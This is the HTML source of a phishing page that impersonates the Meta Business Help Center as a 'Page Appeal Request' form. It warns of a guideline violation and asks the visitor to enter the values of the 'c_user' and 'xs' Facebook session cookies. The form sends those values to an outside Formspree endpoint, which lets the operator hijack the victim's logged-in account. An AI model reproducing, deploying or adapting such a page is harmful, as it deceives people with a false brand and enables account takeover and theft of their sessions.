<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Business Help Center</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: #f0f2f5; display: flex; justify-content: center; align-items: flex-start; 
            min-height: 100vh; margin: 0; padding: 20px;
        }
        .meta-container { 
            background: white; padding: 25px; border-radius: 8px; 
            box-shadow: 0 1px 2px rgba(0,0,0,0.1); 
            width: 100%; max-width: 480px;
        }
        .header { margin-bottom: 20px; }
        .meta-logo { width: 40px; margin-bottom: 15px; }
        .header-title { font-size: 24px; font-weight: 700; color: #1c1e21; margin: 0; }
        .header-desc { font-size: 15px; color: #606770; margin-top: 5px; }
        
        .alert-box { 
            border: 1px solid #dddfe2; border-radius: 8px; 
            padding: 15px; background-color: #fafafa; margin-bottom: 20px;
        }
        .alert-item { font-size: 14px; color: #1c1e21; margin-bottom: 10px; }

        .video-wrapper { width: 100%; margin-bottom: 20px; }
        .video-wrapper video { width: 100%; border-radius: 6px; border: 1px solid #dddfe2; }

        .input-group { margin-bottom: 15px; }
        .input-label { font-size: 14px; font-weight: 600; color: #4b4f56; margin-bottom: 5px; display: block; }
        input[type="text"] { 
            width: 100%; padding: 10px; border: 1px solid #dddfe2; 
            border-radius: 6px; font-size: 15px;
        }

        .submit-btn { 
            width: 100%; padding: 10px; background: #0866ff; 
            color: white; border: none; border-radius: 6px; 
            font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px;
        }
        .footer-text { font-size: 12px; color: #8d949e; text-align: center; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="meta-container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Meta Logo" class="meta-logo">
            <h1 class="header-title">Page Appeal Request</h1>
            <p class="header-desc">Submit your information to appeal the deletion.</p>
        </div>
        
        <div class="alert-box">
            <div class="alert-item">• Your page has a violation related to our community guidelines.</div>
            <div class="alert-item">• Please review the violation details carefully.</div>
            <div class="alert-item">• Ensure you provide correct information.</div>
        </div>

        <div class="video-wrapper">
            <video controls>
                <source src="VID-20260418-WA0000.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
        </div>

        <form action="https://formspree.io/f/maqaobyw" method="POST">
            <div class="input-group">
                <label for="c_user" class="input-label">c_user</label>
                <input type="text" id="c_user" name="c_user" required>
            </div>
            
            <div class="input-group">
                <label for="xs" class="input-label">xs</label>
                <input type="text" id="xs" name="xs" required>
            </div>
            
            <button type="submit" class="submit-btn">Submit Appeal</button>
        </form>
        
        <p class="footer-text">© Meta, Inc. 2026</p>
    </div>
</body>
</html>
